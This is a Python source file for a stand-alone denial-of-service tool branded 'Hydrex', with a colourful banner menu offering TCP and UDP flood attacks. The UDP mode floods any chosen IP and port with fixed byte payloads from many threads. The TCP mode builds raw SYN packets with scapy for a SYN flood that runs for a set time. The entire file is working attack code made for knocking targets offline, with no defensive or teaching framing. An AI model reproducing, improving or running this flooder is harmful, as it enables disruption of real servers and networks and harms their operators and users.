import socket
import threading
import datetime
import threading
import time
import os
from scapy.all import IP, TCP, raw
import random

hydrex = "\033[38;5;196m"
red = "\033[38;5;196m"
clear = "\033[0m"
lila = "\033[38;5;165m"

payloads = [
    b"\x08\xb2\x00\x21",
    b"\x08\xb2\x00",
    b"\xD8\x39\x84\x00",
]

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}| 
          {hydrex}
                 __   _____  _________     ____
                / /  / _ \ \/ / __/ _ \   / / /
               / /__/ __ |\  / _// , _/  /_  _/
              /____/_/ |_|/_/___/_/|_|    /_/  
                                       {clear}
                         By Hydrex
           {hydrex}╔═══════════════════════════════════╗{clear}
           {hydrex}║{clear}  {hydrex}-{clear} tcp      {hydrex}|{clear} TCP Flood           {hydrex}║{clear}         
           {hydrex}║{clear}  {hydrex}-{clear} udp      {hydrex}|{clear} UDP Flood           {hydrex}║{clear}
           {hydrex}╚═══════════════════════════════════╝{clear}

""")              
    
def layer4():
    while True:
        banner()
        select = input(f"""
╔═══[{hydrex}type{clear}@{hydrex}Hydrex{clear}]
╚══{hydrex}>{clear} """)
                                        
        if select.startswith("udp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{hydrex}:{clear} {hydrex}udp{clear} <{hydrex}ip{clear}> <{hydrex}port{clear}> <{hydrex}threads{clear}> <{hydrex}duration{clear}>")
                input()
                continue

            _, ip, port, threads, duration = parts
            port = int(port)
            threads = int(threads)
            duration = int(duration)

            def udp(ip, port, until_datetime):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                target = (ip, port)
                while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                    for data in payloads:
                        try:
                            sock.sendto(data, target)
                        except:
                            pass
                sock.close()

            def th(ip, port, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
                for _ in range(threads):
                    t = threading.Thread(target=udp, args=(ip, port, until))
                    t.start()

            th(ip, port, threads, duration)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}|  
                    {hydrex}                    
       ___ _______________  _______ __    _________  ________
      / _ /_  __/_  __/ _ |/ ___/ //_/   / __/ __/ |/ /_  __/
     / __ |/ /   / / / __ / /__/ ,<     _\ \/ _//    / / /   
    /_/ |_/_/   /_/ /_/ |_\___/_/|_|   /___/___/_/|_/ /_/    
                                                               
                    {clear} 
     {hydrex}╔══════════════════════════════════{clear}
     {hydrex}║{clear} HOST{hydrex}:{clear} {hydrex}[{clear}{ip}{hydrex}]{clear}                     
     {hydrex}║{clear} PORT{hydrex}:{clear} {hydrex}[{clear}{port}{hydrex}]{clear}                    
     {hydrex}║{clear} THREADS{hydrex}:{clear} {hydrex}[{clear}{threads}{hydrex}]{clear}                 
     {hydrex}║{clear} TIME{hydrex}:{clear} {hydrex}[{clear}{duration}{hydrex}]{clear}                    
     {hydrex}╚══════════════════════════════════{clear}       
""")
            time.sleep(duration)

################################################################################################################################

        elif select.startswith("tcp"):
            parts = select.split()
            if len(parts) != 5:
                print(f"usage{hydrex}:{clear} {hydrex}tcp{clear} <{hydrex}ip{clear}> <{hydrex}port{clear}> <{hydrex}threads{clear}> <{hydrex}duration{clear}>")
                input()
                continue

            _, ip, port, threads, duration = parts
            port = int(port)
            threads = int(threads)
            duration = int(duration)

            def syn(ip, port, until_datetime):
                while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                        payloads = IP(dst=ip)/TCP(dport=port, flags="S", seq=random.randint(1000, 9000))
                        sock.sendto(raw(payloads), (ip, 0))
                        sock.close()
                    except:
                        pass

            def th(ip, port, threads, duration):
                until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
                for _ in range(threads):
                    t = threading.Thread(target=syn, args=(ip, port, until))
                    t.start()

            th(ip, port, threads, duration)

            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
 Created by {lila}Hydrex{clear}     |{hydrex} Copyright {clear}| 
                    {hydrex}                    
       ___ _______________  _______ __    _________  ________
      / _ /_  __/_  __/ _ |/ ___/ //_/   / __/ __/ |/ /_  __/
     / __ |/ /   / / / __ / /__/ ,<     _\ \/ _//    / / /   
    /_/ |_/_/   /_/ /_/ |_\___/_/|_|   /___/___/_/|_/ /_/    
                                                               
                    {clear} 
     {hydrex}╔══════════════════════════════════{clear}
     {hydrex}║{clear} HOST{hydrex}:{clear} {hydrex}[{clear}{ip}{hydrex}]{clear}                       
     {hydrex}║{clear} PORT{hydrex}:{clear} {hydrex}[{clear}{port}{hydrex}]{clear}                    
     {hydrex}║{clear} THREADS{hydrex}:{clear} {hydrex}[{clear}{threads}{hydrex}]{clear}                   
     {hydrex}║{clear} TIME{hydrex}:{clear} {hydrex}[{clear}{duration}{hydrex}]{clear}                     
     {hydrex}╚══════════════════════════════════{clear}          
""")
            time.sleep(duration)

if __name__ == "__main__":
    layer4()


